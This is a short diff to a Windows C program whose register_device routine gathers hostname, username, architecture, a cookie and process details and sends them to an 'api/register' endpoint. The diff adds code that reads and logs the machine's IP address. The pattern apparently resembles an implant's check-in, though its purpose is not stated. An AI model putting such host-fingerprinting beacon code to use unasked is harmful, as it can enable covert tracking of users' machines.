@@ -1,3 +1,4 @@
+#include <iphlpapi.h>
 #include <windows.h>
 #include <wininet.h>
 #include <tlhelp32.h>
@@ -347,8 +348,9 @@ void register_device() {
     process_info.dwSize = sizeof(PROCESSENTRY32);
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-    // data.status = 1;
-    // data.format = "%d:%s,%s,%s,%lu,%s,%s";
+    PIP_ADAPTER_INFO adapter = NULL;
+    ULONG adapter_size = sizeof(IP_ADAPTER_INFO);
+
     data.format = "%s,%s,%s,%lu,%s,%s";
     transport.path = "api/register";
 
@@ -390,6 +392,15 @@ void register_device() {
     }
     else {
         log_error("Error: %lu\n", dw_error);
+    }
+
+    GetAdaptersInfo(NULL, &adapter_size);
+    if ((adapter = LocalAlloc(LPTR, adapter_size))) {
+        if (GetAdaptersInfo(adapter, &adapter_size) == NO_ERROR) {
+            log_info("Address: %s", adapter->IpAddressList.IpAddress.String);
+        } else {
+            log_error("Error: %lu\n", dw_error);
+        }
     }
 
     DWORD pointer_length = strlen(data.format) + strlen(auth.cookie) + strlen(info.hostname) + strlen(info.username) + 4 + strlen(info.name) + strlen(info.arch);
